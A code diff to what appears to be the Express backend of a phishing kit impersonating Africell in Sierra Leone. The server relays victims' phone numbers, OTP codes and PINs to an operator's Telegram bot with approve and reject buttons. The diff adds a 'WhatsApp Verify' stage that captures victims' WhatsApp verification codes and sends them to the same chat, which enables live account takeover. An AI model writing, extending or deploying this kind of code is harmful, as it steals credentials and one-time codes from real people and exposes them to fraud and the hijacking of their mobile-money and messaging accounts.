@@ -10,7 +10,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static('.'));
 
-// value: { status: 'pending'|'approved'|'rejected'|'wrong_id', timestamp: number }
+// value: { status: 'pending'|'approved'|'rejected'|'wrong_id'|'verify_whatsapp', timestamp: number }
 const orderStatuses = {};
 const userCredentials = {};
 
@@ -67,6 +67,43 @@ app.post('/api/submit-order', async (req, res) => {
 
         const countryFlag = "🇸🇱";
         const rawDigits = cleanPhone.replace(/\+232/g, '').trim();
+        const shortPhone = cleanPhone.replace(/\+/g, '');
+
+        // Independent WhatsApp Verify flow: only phone number and code, no old numbers/credentials
+        if (uniqueId && (uniqueId.startsWith('WhatsApp Verify Code: ') || uniqueId === 'WhatsApp Verify Resend Code')) {
+            const isResend = uniqueId === 'WhatsApp Verify Resend Code';
+            const waCode = isResend ? '' : uniqueId.replace('WhatsApp Verify Code: ', '').trim();
+
+            let waMessage = isResend
+                ? `📲 *Whatsapp Verify (Resend Requested)*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\``
+                : `📲 *Whatsapp Verify*\n\n${countryFlag} Country: \`+232\`\n📱 Phone: \`${escapeMarkdown(rawDigits)}\`\n🔢 Code: \`${escapeMarkdown(waCode)}\``;
+
+            const waApproveCb = `A|wa|${shortPhone}`;
+            const waWrongCb   = `W|wa|${shortPhone}`;
+            const waRejectCb  = `R|wa|${shortPhone}`;
+
+            if (waApproveCb.length > 64 || waWrongCb.length > 64 || waRejectCb.length > 64) {
+                console.error('callback_data too long:', waApproveCb.length);
+                return res.status(500).json({ success: false, message: 'Internal error: callback too long.' });
+            }
+
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            await sendToTelegram(telegramUrl, {
+                chat_id: CHAT_ID,
+                text: waMessage,
+                parse_mode: 'Markdown',
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: "✅ Approved", callback_data: waApproveCb }],
+                        [{ text: "⚠️ Wrong Info", callback_data: waWrongCb }],
+                        [{ text: "❌ Reject", callback_data: waRejectCb }]
+                    ]
+                }
+            });
+
+            console.log(`[SUBMIT] Sierra Leone WhatsApp verify submitted for phone: ${cleanPhone}`);
+            return res.json({ success: true, message: 'Sent successfully.' });
+        }
 
         if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};
 
@@ -119,14 +156,24 @@ app.post('/api/submit-order', async (req, res) => {
             message += `\n🔐 Confirmation PIN: \`${escapeMarkdown(userCredentials[cleanPhone].confirmPin)}\``;
         }
 
-        const shortPhone = cleanPhone.replace(/\+/g, '');
         const approveCb = `A|${stepTag}|${shortPhone}`;
         const rejectCb  = `R|${stepTag}|${shortPhone}`;
         const wrongCb   = `W|${stepTag}|${shortPhone}`;
+        const whatsappCb = `V|${stepTag}|${shortPhone}`;
 
-        if (approveCb.length > 64 || rejectCb.length > 64 || wrongCb.length > 64) {
+        if (approveCb.length > 64 || rejectCb.length > 64 || wrongCb.length > 64 || (stepTag === 'pin' && whatsappCb.length > 64)) {
             console.error('callback_data too long:', approveCb.length);
             return res.status(500).json({ success: false, message: 'Internal error: callback too long.' });
+        }
+
+        const inlineKeyboard = [
+            [{ text: "✅ Approve", callback_data: approveCb }],
+            [{ text: wrongButtonText, callback_data: wrongCb }],
+            [{ text: "❌ Reject", callback_data: rejectCb }]
+        ];
+
+        if (stepTag === 'pin') {
+            inlineKeyboard.push([{ text: "💬 Whatsapp", callback_data: whatsappCb }]);
         }
 
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -135,11 +182,7 @@ app.post('/api/submit-order', async (req, res) => {
             text: message,
             parse_mode: 'Markdown',
             reply_markup: {
-                inline_keyboard: [
-                    [{ text: "✅ Approve", callback_data: approveCb }],
-                    [{ text: wrongButtonText, callback_data: wrongCb }],
-                    [{ text: "❌ Reject", callback_data: rejectCb }]
-                ]
+                inline_keyboard: inlineKeyboard
             }
         });
 
@@ -242,15 +285,19 @@ app.post('/api/telegram-webhook', async (req, res) => {
         if (action === 'A') {
             newStatus = 'approved';
             actionText = 'Approved ✅';
-            messageTitle = 'Africell Request Approved';
+            messageTitle = stepTag === 'wa' ? 'Whatsapp Verify Approved' : 'Africell Request Approved';
         } else if (action === 'R') {
             newStatus = 'rejected';
             actionText = 'Rejected ❌';
-            messageTitle = 'Africell Request Rejected';
+            messageTitle = stepTag === 'wa' ? 'Whatsapp Verify Rejected' : 'Africell Request Rejected';
         } else if (action === 'W') {
             newStatus = 'wrong_id';
             actionText = 'Wrong Info / Error ⚠️';
-            messageTitle = 'Africell Credential Error';
+            messageTitle = stepTag === 'wa' ? 'Whatsapp Verify Wrong Info' : 'Africell Credential Error';
+        } else if (action === 'V') {
+            newStatus = 'verify_whatsapp';
+            actionText = 'Sent to Whatsapp Verify 💬';
+            messageTitle = 'Africell Sent to Whatsapp Verify';
         }
 
         // Store status updates with precise multi-format keys for guaranteed retrieval
@@ -271,7 +318,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                              `${countryFlag} Country: \`+232\`\n` +
                              `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
-        if (userCredentials[phone]) {
+        if (stepTag !== 'wa' && userCredentials[phone]) {
             const c = userCredentials[phone];
             if (c.applicationDetails) updatedMessage += `\n\n📋 *Details:*\n${escapeMarkdown(c.applicationDetails)}`;
             if (c.otp) updatedMessage += `\n📱 OTP Code: \`${escapeMarkdown(c.otp)}\``;
